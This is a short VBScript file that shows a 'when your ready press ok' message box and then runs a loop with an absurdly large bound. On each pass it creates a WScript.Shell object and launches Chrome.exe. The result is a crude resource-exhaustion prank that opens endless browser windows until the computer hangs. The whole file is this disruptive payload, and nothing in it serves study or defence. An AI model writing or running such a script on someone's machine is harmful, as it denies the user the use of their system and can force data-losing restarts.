msgbox("when your ready press ok")
for count = 0 to 5000000000000000000000000000000000000000000000000000000000000000000000
	Set objShell = WScript.CreateObject("WScript.Shell")
	objShell.Run "Chrome.exe"
next
